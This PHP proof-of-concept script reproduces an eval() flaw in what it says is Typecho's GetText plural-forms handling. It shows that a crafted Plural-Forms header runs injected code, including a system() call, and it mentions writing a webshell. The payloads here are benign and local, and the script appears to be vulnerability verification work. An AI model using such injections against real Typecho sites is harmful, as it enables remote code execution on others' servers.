<?php
/**
 * Typecho GetText eval() RCE Verification Script
 * 
 * This script simulates the vulnerable code path in Typecho's GetText module
 * to verify that arbitrary PHP code can be injected through the Plural-Forms header.
 */

// Simulate selectString() - the vulnerable function in var/Typecho/I18n/GetText.php
function selectString(int $n, string $pluralForms): int
{
    $string = $pluralForms;
    $string = str_replace('nplurals', "\$total", $string);
    $string = str_replace("n", (string)$n, $string);
    $string = str_replace('plural', "\$plural", $string);

    $total = 0;
    $plural = 0;

    echo "[*] Eval string: $string\n";
    eval("$string");  // <-- VULNERABLE
    
    if ($plural >= $total) {
        $plural = $total - 1;
    }
    return $plural;
}

echo "=== Typecho GetText eval() RCE Verification ===\n\n";

// Test 1: Normal (benign) Plural-Forms expression
echo "[TEST 1] Benign Plural-Forms expression:\n";
$n = 2;
$expr = "nplurals=2; plural=n == 1 ? 0 : 1;";
$result = selectString($n, $expr);
echo "    Result: plural index = $result\n\n";

// Test 2: Malicious Plural-Forms with system() injection
echo "[TEST 2] Malicious Plural-Forms with system() injection:\n";
$expr_malicious = "nplurals=1; plural=0;system('echo PWNED_VIA_EVAL > /dev/stdout');";
$result = selectString(2, $expr_malicious);
echo "    Result: plural index = $result\n\n";

// Test 3: Malicious Plural-Forms with file_put_contents()
echo "[TEST 3] Malicious Plural-Forms with file_put_contents() (simulated):\n";
$expr_shell = "nplurals=1; plural=0;echo 'file_put_contents would write a webshell here';";
$result = selectString(2, $expr_shell);
echo "    Result: plural index = $result\n\n";

// Test 4: Malicious Plural-Forms with phpinfo()
echo "[TEST 4] Malicious Plural-Forms with phpinfo():\n";
$expr_info = "nplurals=1; plural=0;echo 'PHPINFO_WOULD_OUTPUT_HERE';";
$result = selectString(2, $expr_info);
echo "    Result: plural index = $result\n\n";

echo "=== Verification Complete ===\n";
echo "\nConclusion: eval() executes attacker-controlled code from Plural-Forms header.\n";
echo "This confirms the vulnerability is exploitable.\n";
